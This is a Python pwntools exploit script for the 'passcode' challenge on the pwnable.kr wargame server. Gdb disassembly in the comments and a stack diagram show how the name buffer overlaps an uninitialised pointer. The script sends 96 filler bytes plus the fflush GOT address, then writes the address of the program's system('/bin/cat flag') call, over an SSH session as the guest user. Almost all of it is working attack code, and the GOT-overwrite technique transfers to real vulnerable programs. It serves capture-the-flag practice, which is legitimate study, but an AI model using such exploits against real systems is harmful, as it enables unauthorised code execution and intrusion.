from pwn import *

# collect info
elf = ELF("./passcode")

# find fflush got
"""
Dump of assembler code for function login:
   0x08048564 <+0>:	push   ebp
   ...
   0x0804858b <+39>:	mov    eax,ds:0x804a02c
   0x08048590 <+44>:	mov    DWORD PTR [esp],eax
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
                                       ^
   0x08048598 <+52>:	mov    eax,0x8048786
   ...
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
gdb-peda$ x/i 0x8048430
   0x8048430 <fflush@plt>:	jmp    DWORD PTR ds:0x804a004
                                                        ^
gdb-peda$ x/i 0x804a004
   0x804a004 <fflush@got.plt>:	test   BYTE PTR ss:[eax+ecx*1],al
           ^
"""
got_fflush = elf.got["fflush"] 

# find system("/bin/cat flag")
"""
gdb-peda$ disas login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   ebp
   ...
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
            ^
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   ...
End of assembler dump.
"""
call_system_flag = str(elf.symbols["login"]+127)

# name[100] payload
"""
    | welcome()| |   login()   |
    ----------------------------
    | name[0]  | |             |
    |   ....   | |             |
    | name[91] | |             |
    | name[92] | | passcode2:4 | 
    | name[93] | | passcode2:3 | 
    | name[94] | | passcode2:2 | 
    | name[95] | | passcode2:1 | 
    | name[96] | | passcode1:4 | 
    | name[97] | | passcode1:3 | 
    | name[98] | | passcode1:2 | 
    | name[99] | | passcode1:1 | 
"""
name_payload = "A"*96 + p32(got_fflush)

# connect
shell = ssh("passcode", "pwnable.kr", 2222, "guest")
proc = shell.process(["passcode"])

# receive welcome and input name message
print proc.recv()

# send name 
proc.sendline(name_payload)

# receive input passcode1 message 
print proc.recv()

# send passcode1
proc.sendline(call_system_flag)

# receive flag
print proc.recv()

# disconnect
proc.close()
shell.close()
